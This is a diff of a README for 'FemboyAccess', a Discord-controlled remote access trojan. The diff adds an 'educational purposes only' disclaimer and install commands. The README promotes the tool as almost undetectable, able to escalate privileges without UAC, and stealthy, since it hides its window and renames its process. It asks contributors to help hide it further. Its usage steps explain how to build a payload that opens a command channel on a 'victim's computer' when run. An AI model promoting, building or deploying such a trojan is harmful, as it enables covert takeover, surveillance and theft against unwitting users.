@@ -5,11 +5,15 @@
   FemboyAccess is a remote administration trojan that uses Discord as a C2C server.
 </p>
 
-## Purpose
+## ⚠️ Disclaimer ⚠️
+
+**<div align="center">This project is intended for educational and research purposes only. It is your responsibility to ensure that you use this software in compliance with all applicable laws. The authors of this project are not responsible for any misuse or illegal activities performed with it.</div>**
+
+## Purpose 🔥
 
 FemboyAccess is a RAT (Remote Administration Tool/Trojan) that uses the Discord platform as a C2C (command & control) server. More specifically, it uses your own custom Discord guild and then uses a bot account to send commands from the server to the victim's computer.
 
-## Features
+## Features ✨
 
 - almost undetectable
 - escalate privileges without UAC
@@ -19,9 +23,9 @@ FemboyAccess is a RAT (Remote Administration Tool/Trojan) that uses the Discord 
 
 FemboyAccess 1.6 and higher contains a stealth mode activated by default (line `126` to change that) that hides the Python window and changes the process name. Reminder that you can create pull requests, so if you have any ideas to hide FemboyAccess even more, give it a shot!
 
-## Usage
+## Usage 🛠
 
-  1. Download Python with all the necessary requirements and the repository to your computer.
+  1. Download Python with all the necessary requirements (`pip install -r requirements.txt` or `pip install -r builder_requirements.txt` for the builder) and the repository to your computer.
   2. [Create a Discord bot](https://discord.dev/) (make sure to check all intents on) then invite it on a new server.
   3. Open `builder.py` and enter what's requested (server ID and bot token).
   4. Finished! Now, you can obfuscate it yourself if you want to. Whenever someone will open the generated `built_femboyaccess.py` file, a new channel will be created in your defined server with a custom session ID. Type `help` to see a list of all available commands.
@@ -34,12 +38,13 @@ So if the computer's name is 'ambr0sial', the channel name will be something lik
 
 `ambr0sial-6ef87f83`
 
-## License
+## License 📜
 
 FemboyAccess is using the CC BY-NC 4.0 license. You can click on the badge to see what's it's all about! ✨
 
 [![License: CC BY-NC 4.0](https://img.shields.io/badge/License-CC_BY--NC_4.0-magenta.svg)](https://creativecommons.org/licenses/by-nc/4.0/)
-## Contributing
+
+## Contributing ❤
 
 Contributions are always welcome!
 
